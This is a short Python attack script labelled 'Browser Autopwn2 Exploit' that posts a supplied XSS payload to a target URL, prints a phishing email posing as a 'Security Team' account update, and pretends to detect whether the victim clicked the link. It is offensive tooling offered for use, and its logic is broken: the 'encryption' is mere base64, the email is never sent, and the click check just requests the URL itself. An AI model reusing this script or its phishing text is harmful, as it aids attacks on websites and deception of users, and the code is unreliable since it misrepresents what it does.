import requests
import sys
import time
import argparse
import random
import string
import base64
import hashlib

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encrypt_payload(payload):
    key = generate_random_string(16)
    cipher = base64.b64encode(payload.encode())
    return f"{key}:{cipher.decode()}"

def exploit(target_url, payload, phishing_url):
    try:
        # Step 1: Identify the target URL
        print("[+] Target URL:", target_url)

        # Step 2: Send a malicious request to the target URL
        encrypted_payload = encrypt_payload(payload)
        response = requests.post(target_url, data=encrypted_payload)

        # Step 3: Check if the XSS payload was executed
        if payload in response.text:
            print("[+] vulnerability detected and exploited!")
        else:
            print("[-] Failed to exploit vulnerability.")

        # Step 4: Deliver a phishing email to the user
        phishing_email = f"""
        Subject: Important Security Update
        Hi,
        We have detected a security vulnerability in your account. Please click the following link to update your account information:
        {phishing_url}
        Best regards,
        Security Team
        """
        print("[+] Phishing email delivered to the user:")
        print(phishing_email)

        # Step 5: Wait for the user to click the phishing link
        print("[*] Waiting for the user to click the phishing link...")
        time.sleep(10)  # Wait for 10 seconds

        # Step 6: Check if the user has clicked the phishing link
        # (Simulating this by checking if the phishing URL is visited)
        if requests.get(phishing_url).status_code == 200:
            print("[+] User has clicked the phishing link!")
        else:
            print("[-] User has not clicked the phishing link.")

    except Exception as e:
        print("[-] An error occurred:", str(e))
        sys.exit(1)

# Usage: python script.py -u <target_url> -p <payload> -ph <phishing_url>
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Browser Autopwn2 Exploit")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("-p", "--payload", help="XSS Payload", required=True)
    parser.add_argument("-ph", "--phishing", help="Phishing URL", required=True)
    args = parser.parse_args()

    target_url = args.url
    payload = args.payload
    phishing_url = args.phishing
    exploit(target_url, payload, phishing_url)
